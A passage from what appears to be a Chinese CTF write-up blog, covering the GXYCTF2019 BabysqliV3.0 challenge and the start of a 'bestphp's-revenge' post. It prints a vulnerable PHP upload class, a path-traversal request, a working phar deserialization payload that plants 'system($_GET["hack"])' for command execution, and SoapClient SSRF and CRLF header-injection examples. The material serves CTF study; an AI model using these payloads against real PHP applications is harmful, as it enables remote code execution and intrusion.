class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;</span><br><span class="language-php">@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php"><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-variable">$this</span>-&gt;Filename))&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>)&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php"><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php"><span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="language-php"><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;Filename;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;</span><br><span class="language-php"><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="language-php"><span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();</span><br><span class="language-php"><span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>两种解法。</p><h2 id="解法一-直接读取flag"><a href="#解法一-直接读取flag" class="headerlink" title="解法一 直接读取flag"></a>解法一 直接读取flag</h2><p>重点代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br><span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有file_get_contents函数，而$uploader是一个Uploader类的对象，当被当做字符串调用时会触发toString魔术方法，输出文件名。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">function __toString()&#123;<br><span class="hljs-keyword">global</span> $sandbox<span class="hljs-comment">;</span><br><span class="hljs-keyword">global</span> $ext<span class="hljs-comment">;</span><br>// <span class="hljs-keyword">return</span> $sandbox.$this-&gt;Filename.$ext<span class="hljs-comment">;</span><br><span class="hljs-keyword">return</span> $this-&gt;Filename<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而文件名可以通过GET传参，只要不包含不包含特定的危险字符串（如 data:&#x2F;&#x2F;、filter:&#x2F;&#x2F;、php:&#x2F;&#x2F; 或 .），然后就会赋值给filename</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们只需要上传一个符合规定的文件，然后修改url</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">url/home.php?<span class="hljs-keyword">file</span>=upload&amp;<span class="hljs-keyword">name</span>=/<span class="hljs-keyword">var</span>/www/html/flag.php<br></code></pre></td></tr></table></figure><p>利用bp抓包拿到flag</p><p><img src="/../image/GXYCTF2019-BabysqliV3.0-4.png"></p><h2 id="解法二-phar反序列化"><a href="#解法二-phar反序列化" class="headerlink" title="解法二 phar反序列化"></a>解法二 phar反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br><br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>&#125;<br> <br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-variable">$this</span>-&gt;Filename))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br><span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;Filename;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>&#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br><span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);<br>&#125;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>反序列化：_destruct：销毁执行函数</strong></p><p>$this-&gt;Filename &#x3D; $sandbox.$_SESSION[‘user’].$ext;</p><p>eval($this-&gt;cmd);</p><p><strong>文件读取：</strong></p><p>echo file_get_contents($uploader);</p><p><strong>利用点：</strong></p><p>eval($this-&gt;cmd);</p><p>echo file_get_contents($uploader);</p><p>cmd&#x3D;获取flag命令或者写入一句话木马命令</p><p>echo file_get_contents($uploader)：</p><p>file_get_contents($uploader)读取文件：</p><p>echo：写入</p><p><strong>文件：phar.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-comment">//public $cmd =&#x27;echo phpinfo();&#x27;;//可先用此测试</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> =<span class="hljs-string">&#x27;echo system($_GET[&quot;hack&quot;]);&#x27;</span>;<span class="hljs-comment">//传递一个可控hack参数</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span> =<span class="hljs-string">&#x27;GXY9834eb59bc1f28aec81f3e7e745472aa&#x27;</span>;<span class="hljs-comment">//先上串一个合法文件得到session[&#x27;user&#x27;]</span><br><br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;demo.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;demo.phar&quot;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF8a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span>    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;text.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>流程:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.php执行文件-&gt;phar<br>2.上传文件保存<br>3.phar读取此文件序列化文件<br>4.定义uploader：<br>5.filename  token 执行_destruct  ---------<span class="hljs-variable">$this</span>-cmd-&gt;<span class="hljs-variable">$cmd</span>-&gt;echo system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hack&quot;</span>])<br>6.<span class="hljs-attribute">hack</span>=ls<br>7.<span class="hljs-attribute">hack</span>=cat flag<br></code></pre></td></tr></table></figure><p>上传成功后的路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>ploads<span class="hljs-regexp">/f328ed2b4f583b5040837b9b1e6478d9/</span>GXY9834eb59bc1f28aec81f3e7e745472aa.txt<br></code></pre></td></tr></table></figure><p>由这行代码可得<code>$this-&gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;</code><br><code>session[&#39;user&#39;=GXY9834eb59bc1f28aec81f3e7e745472aa</code></p><p>然后点上传抓包，修改为。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home.php?file=upload&amp;name=phar:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/uploads/</span>f328ed2b4f583b5040837b9b1e6478d9/GXY9834eb59bc1f28aec81f3e7e745472aa.txt&amp;hack=ls<br></code></pre></td></tr></table></figure><p><img src="/../image/GXYCTF2019-BabysqliV3.0-5.png"></p><p>成功命令执行并且回显。</p><p>将hack&#x3D;ls改成hack&#x3D;cat%20flag.php即可拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 弱密码 </tag>
            
            <tag> 伪协议 </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bestphp&#39;s-revenge</title>
      <link href="/2025/05/05/bestphp-s-revenge/"/>
      <url>/2025/05/05/bestphp-s-revenge/</url>
      
        <content type="html"><![CDATA[<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s-revenge"></a>bestphp’s-revenge</h1><p>参考博客：<a href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="一-SoapClient"><a href="#一-SoapClient" class="headerlink" title="一. SoapClient"></a>一. SoapClient</h2><p><strong>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</strong><br><strong>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</strong></p><p><img src="/../image/bestphp's-revenge-1.png"></p><p>第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p><p>用法实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(location<span class="hljs-string">&#x27;=&gt;&#x27;</span>http:<span class="hljs-comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure><p>可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p><p><img src="/../image/bestphp's-revenge-2.png"></p><hr><h2 id="二-CRLF-Injection漏洞"><a href="#二-CRLF-Injection漏洞" class="headerlink" title="二. CRLF Injection漏洞"></a>二. CRLF Injection漏洞</h2><p><strong>首先要对HTTPheaders 和 HTTPbody 要有一些基本的了解，如图，它们之前用空行区分</strong></p><p><img src="/../image/bestphp's-revenge-3.png"></p><p><strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br> <strong>简单来说</strong><br> <strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://localhost:2333&quot;</span>;<br><span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;location&quot;</span> =&gt; <span class="hljs-variable">$target</span>,<br>    <span class="hljs-string">&quot;user_agent&quot;</span> =&gt; <span class="hljs-string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,<br>    <span class="hljs-string">&quot;uri&quot;</span> =&gt; <span 